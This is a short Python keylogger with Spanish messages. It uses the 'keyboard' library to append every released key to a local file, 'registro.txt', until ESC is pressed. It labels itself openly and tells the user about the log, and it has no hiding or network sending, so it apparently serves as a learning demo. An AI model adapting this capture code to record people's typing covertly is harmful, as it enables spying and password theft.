import keyboard

ARCHIVO_LOG = "registro.txt"

def registrar_tecla(evento):
    with open(ARCHIVO_LOG, "a", encoding="utf-8") as archivo:
        tecla = evento.name
        
        if tecla == "space":
            archivo.write(" ")
        elif tecla == "enter":
            archivo.write("\n")
        elif tecla == "tab":
            archivo.write("\t")
        elif len(tecla) > 1:
            archivo.write(f" [{tecla}] ")
        else:
            archivo.write(tecla)

def main():
    print("--Keylogger--")
    print(f"Escribe todo lo que quieras y ves lo que pusiste aqui: {ARCHIVO_LOG}")
    print("Para parar y cerrar el programa presiona 'ESC'.")
    
    keyboard.on_release(registrar_tecla)
    keyboard.wait("esc")
    
    print("\nSe paro el programa. Revisa el archivo registro.txt.")

if __name__ == "__main__":
    main()